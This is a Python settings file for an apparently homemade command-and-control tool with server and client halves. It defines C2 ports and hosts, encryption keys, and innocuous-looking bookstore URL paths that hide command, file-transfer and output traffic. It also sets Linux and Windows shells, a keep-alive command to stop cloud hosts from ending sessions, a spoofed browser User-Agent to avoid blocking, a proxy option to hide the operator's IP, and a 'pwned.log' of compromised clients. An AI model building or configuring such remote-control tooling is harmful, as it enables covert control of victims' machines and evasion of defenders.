
"""----------Variables used in both Server and Client----------"""
# C2 Server Port for client and Server
PORT = 80

# key use in Encryption/Decryption & This key must be 32 or fewer characters
KEY = "U can't touch this!"

# Path to use signifying a command request from a client using HTTP GET
CMD_REQUEST = "/book?isbn="

# Path to use for signifying a file download request from the client using HTTP GET
FILE_REQUEST = "/author?name="

# Path to use signifying a file upload from a file client using HTTP GET
FILE_SEND = "/reviews"

# Path to use signifying a command output from a client using HTTP GET
RESPONSE = "/inventory"

# Path to use signifying current directory from a client using HTTP GET
CWD_RESPONSE = "/title"


# Post variable name to user for assigning to command output from a client
RESPONSE_KEY = "index"

# Password use for Encrypting & Decrypting zip files; must be byte's data type
ZIP_PASSWORD = b"*--->Red_Team_Winning<---*"

"""Shell Commands"""
#Shell for linux
SHELL = "/bin/bash"

#Shell for Windows
#SHELL = "cmd.exe"

#SHELL Commands based on OS
SHELL_LINUX = "/bin/bash"
SHELL_WINDOWS = "cmd.exe"

"""----------Variables used in C2 server Only----------"""
# Leave blank to Binding to all interfaces, Otherwise Enter C2 Servers IP Address
#BIND_ADDR = "192.168.180.1"
BIND_ADDR = ""

# Command to input timeout settings in seconds; 225 is right for Azure; set to None if unnecessary
# INPUT_TIMEOUT = 225
INPUT_TIMEOUT = None

# Directory to hold uploaded client files, initialize automatically in server side
INCOMING = "incoming"

# Directory to Stage files for possible download to the client
OUTGOING = "outgoing"

"""Detect OS to Run below commands automatically to prevent against Azure, and other hosting environment 
from killing our Active Session,
[*] change KEEP_ALIVE_CMD value to command you want run to keep active session"""
KEEP_ALIVE_CMD = "whoami"

# We should change User-Agent to avoid being blocked, But other keys is Optional
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                         "Chrome/129.0.0.0 Safari/537.36"}
# Log a file to recording Compromised clients
LOG = "pwned.log"

"""----------Variables used in C2 Client Only----------"""
# Set TOR Proxy to more secure and hide your IP address
# PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
PROXY = None

# C2 Server IP Address C2_SERVER = "127.0.0.1"
C2_SERVER = "localhost"
#C2_SERVER = "192.168.10.75"

# Define sleep delay time in seconds for a reconnection attempt
DELAY = 3
